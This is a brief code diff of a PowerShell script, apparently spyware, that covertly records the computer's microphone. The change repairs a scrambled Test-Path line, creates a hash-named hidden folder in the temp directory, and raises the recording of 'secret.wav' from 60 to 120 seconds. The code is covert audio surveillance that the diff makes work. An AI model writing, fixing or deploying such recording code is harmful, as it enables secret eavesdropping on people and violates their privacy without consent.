@@ -154,8 +154,8 @@ function Get-MicrophoneAudio {
 }
 
 $Directory = "$env:tmp\207812f09349ef96b709cfe8d7e295ba"
-if (-not (Test-Path $thType ContainDirectory -Paer)) {
+if (-not (Test-Path $Directory -PathType Container)) {
     New-Item -ItemType Directory -Path $Directory | Out-Null
 }
 
-Get-MicrophoneAudio -Path $Directory\secret.wav -Length 60 -Alias "SECRET"
+Get-MicrophoneAudio -Path "$Directory\secret.wav" -Length 120 -Alias "SECRET"
